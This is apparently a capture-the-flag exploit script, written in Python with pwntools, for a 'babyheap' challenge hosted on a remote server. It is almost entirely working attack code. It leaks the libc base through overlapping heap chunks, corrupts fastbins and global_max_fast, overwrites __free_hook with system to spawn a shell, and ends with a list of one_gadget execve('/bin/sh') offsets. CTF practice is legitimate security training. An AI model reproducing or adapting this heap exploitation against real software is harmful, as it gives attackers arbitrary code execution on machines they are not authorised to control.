from pwn import *
import sys
context.log_level='debug'
debug = 0
file_name = './babyheap'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
ip = 'nc.eonew.cn'
prot = '10502'
if debug:
    r = process(file_name)
    libc = ELF(libc_name)
else:
    r = remote(ip,int(prot))
    libc = ELF(libc_name)

file = ELF(file_name)

sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
def add(chunk_size,value):
    ru('your choice: ')
    sl('1')
    ru('size: ')
    sl(str(chunk_size))
    ru('data: ')
    sl(value)
def delete(index):
    ru('your choice: ')
    sl('2')
    ru('index: ')
    sl(str(index))
def show(index):
    ru('your choice: ')
    sl('4')
    ru('index: ')
    sl(str(index))
def edit(index,value):
    ru('your choice: ')
    sl('3')
    ru('index: ')
    sl(str(index))
    ru('data: ')
    sl(value)
def debug():
    gdb.attach(r)
    # raw_input()

add(0x68,"a"*0x68)

add(0x68,"b"*0x68)
add(0x68,"b"*0x68)
add(0x68,"b"*0x68)
edit(0,"\x11"*0x68+"\xe1")
delete(1)
add(0x68,"b"*0x68)
show(2)
libc_base = u64(r.recv(6)+"\x00\x00")-0x3c4b78
main_arear = libc_base+0x3c4b78
li("libc_base",libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
global_max_fast = 0x3c67f8+libc_base
li("malloc_hook",malloc_hook)
li("free_hook",free_hook)
add(0x68,"\x11"*0x68)
#add(0x68,"\x22"*0x68)
add(0x38,"\x22"*0x38)
add(0x28,"\x33"*0x28)
add(0x68,"\x77"*0x30+p64(0)+p64(0x31)+"\x77"*0x28)
edit(3,"a"*0x68+"\x71")
edit(5,"a"*0x38+"\x71")
delete(5)
delete(6)

add(0x68,"a"*0x30+p64(0)+p64(0x71)+p64(main_arear)+p64(global_max_fast-0x10))
add(0x68,"\x99")

a = [0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
one_gg = 0x45216+libc_base
realloc_hook = libc_base + libc.symbols['__realloc_hook']
gets_addr = libc_base+ libc.symbols['gets']

fake_addr_1 = 0x3c4b20 + libc_base +0x10
delete(2)
delete(0)
delete(4)
add(0x68,p64(malloc_hook-0x23))
add(0x68,p64(malloc_hook-0x23))
add(0x68,p64(malloc_hook-0x23))
add(0x68,"aaa"+"a"*0x8+p64(0)+p64(0)+"\x99"*8+p64(0)+p64(0)+p64(0)+p64(0x71)+p64(0)*6)
delete(1)
delete(0)
edit(4,p64(fake_addr_1)[:7])
# debug()
add(0x68,"a"*8)
add(0x68,p64(0)*7+p64(free_hook-0xb58)+p64(main_arear)*3)
# add(0x68,"\x88"*8)
# debug()

delete(0)
# delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
# delete(8)

# delete(4)
for x in range(13):
  add(0x48,"a"*0x47)
li("addr",free_hook-0xb58)
# add(0x50,"aa")
index = [0,2,3,4,5,6,7,9,10,11,12,13,14]

# for x in index:
#     delete(x)
delete(0)
delete(3)
delete(2)
delete(5)
delete(4)
delete(7)
delete(6)
delete(10)
delete(9)
delete(12)
delete(11)
# delete(14)
delete(13)

edit(1,"\x00"*6)
add(0x28,"a"*0x28)
delete(14)

for x in range(12):
    add(0x48,"a"*0x48)

delete(0)
delete(3)
delete(2)
delete(5)
delete(4)
delete(7)
delete(6)
delete(10)
delete(9)
delete(12)
delete(11)
# delete(14)
delete(13)


edit(1,"\x00"*6)

add(0x40,"\x00"*0x28)


for x in range(10):
    # li("")
    add(0x48,"/bin/sh\x00")

system_addr =  libc_base + libc.symbols['system']
# add(0x38,p64(system_addr)*0x6)
# add(0x48,p64(libc.symbols['system']+libc_base))
# delete(0)
# add(0x18,"\x99"*0x10)
add(0x69,p64(0x0)*5+p64(system_addr))
# debug()
delete(2)

ri()



'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3 execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8 execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf02b0 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL


'''